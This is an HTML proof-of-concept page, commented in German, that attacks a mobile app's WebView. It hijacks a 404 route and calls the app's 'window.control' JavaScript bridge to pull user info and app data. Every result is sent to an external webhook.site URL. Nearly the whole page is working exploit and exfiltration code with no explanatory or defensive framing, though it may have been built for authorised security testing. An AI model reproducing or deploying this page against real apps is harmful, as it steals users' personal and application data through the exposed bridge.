<!DOCTYPE html>
<html>
<head>
    <title>OSL P1 Sandbox Bypass - 404 Catch</title>
</head>
<body>
    <h1>OSL Deep Exfiltration (404 Bypass Mode)</h1>
    <div id="status">Route abgefangen. Scanne Bridge...</div>

    <script>
        const WEBHOOK = 'https://webhook.site/a594f57c-870b-4141-9432-dde76c31be3d';

        function sendLog(stage, data) {
            fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ stage: stage, payload: data, url_fallback: window.location.href })
            });
        }

        // Lebenszeichen: Wir haben den 404 abgefangen und sind INSIDE der App!
        sendLog("404_ROUTE_HIJACKED", "Der Router hat uns auf einen Subpfad geleitet, aber wir haben ihn abgefangen!");

        // Callback-Funktionen registrieren
        const callbackNames = ["handleUserInfo", "handleAppData", "callback", "onSuccess"];
        callbackNames.forEach(name => {
            window[name] = function(p1, p2) { sendLog("CALLBACK_" + name, { arg1: p1, arg2: p2 }); };
        });

        setTimeout(function() {
            if (!window.control) {
                sendLog("BRIDGE_NOT_FOUND", "window.control fehlt in dieser Activity");
                return;
            }

            // Versuche die Daten abzugreifen
            try {
                let syncUser = window.control.getUserInfo("poc");
                let syncApp = window.control.getAppData("poc");
                sendLog("SYNC_DATA_RESULT", { user: syncUser, app: syncApp });
            } catch(e) {
                sendLog("SYNC_ERROR", e.message);
            }

            // Callbacks triggern
            try { window.control.getUserInfo("handleUserInfo"); } catch(e) {}
            try { window.control.getAppData("handleAppData"); } catch(e) {}

        }, 1500);
    </script>
</body>
</html>
